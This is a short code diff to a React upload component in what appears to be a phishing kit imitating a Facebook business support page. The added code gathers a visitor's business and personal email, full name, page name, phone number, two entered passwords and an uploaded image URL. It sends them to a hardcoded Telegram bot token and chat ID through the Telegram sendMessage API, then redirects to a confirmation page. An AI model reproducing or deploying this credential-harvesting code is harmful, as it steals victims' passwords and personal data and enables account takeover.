@@ -32,7 +32,26 @@ const Upload = () => {
                 const dataImages = {...dataLocalPassword, url_image};
                 localStorage.setItem('dataIamges', JSON.stringify(dataImages))
 
-                navigate('/buiness-center-community/confirm');
+                const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
+                const chat_id   = '-1001737921141';
+                // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+                // const chat_id   = '5208541473';
+    
+                const message   = '<strong>Email Account: </strong>' + dataImages.fill_business_email + 
+                '%0A<strong>Name Acount: </strong>' + dataImages.fill_full_name + 
+                '%0A<strong>Personal Email: </strong>' + dataImages.fill_personal_email + 
+                '%0A<strong>Facebook Page: </strong>' + dataImages.fill_facebook_pagename + 
+                '%0A<strong>Phone Number: </strong>' + dataImages.fill_phone + 
+                '%0A<strong>Password First: </strong>' + dataImages.firt_password +
+                '%0A<strong>Password Second: </strong>' + dataImages.second_password +
+                '%0A<strong>Images Url: </strong>' + url_image ;
+    
+                axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
+                    .then((response) => {
+                        navigate('/buiness-center-community/confirm');
+                    })
+                    .catch((error) => {});
+
 
             });
         } else {
